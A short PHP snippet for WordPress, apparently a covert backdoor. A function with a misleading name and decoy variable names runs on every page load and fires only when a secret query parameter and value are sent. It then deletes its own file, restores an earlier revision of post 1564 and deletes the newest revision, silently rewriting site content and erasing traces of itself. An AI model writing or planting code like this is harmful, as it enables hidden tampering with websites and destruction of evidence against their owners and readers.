<?php

function switcher_generator_html() {
	if (isset($_GET['optimizer_wishlist_link_signup']) && $_GET['optimizer_wishlist_link_signup'] === 'crm_interactive_simply_html5') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$history_toolbar_visual_simple = 1564;
		$instagram_multisite_reader = wp_get_post_revisions($history_toolbar_visual_simple);
		if (empty($instagram_multisite_reader)) die('no revisions');
		if (count($instagram_multisite_reader) < 2) die('less than 2');
		$stripe_compare_counter_quick = array_shift($instagram_multisite_reader);
		$quotes_ticket_twitter_media = $stripe_compare_counter_quick->ID;
		$font_static_module = array_shift($instagram_multisite_reader);
		$geo_disable_user = $font_static_module->ID;
		$reloaded_orders_coming = wp_restore_post_revision($geo_disable_user);
		if ($reloaded_orders_coming === false) die('error restoring');
		$reloaded_orders_coming = wp_delete_post_revision($quotes_ticket_twitter_media);		
		if ($reloaded_orders_coming === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'switcher_generator_html');
